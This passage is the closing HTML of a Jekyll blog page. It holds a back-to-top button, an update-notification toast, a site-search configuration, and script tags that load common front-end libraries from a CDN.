btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
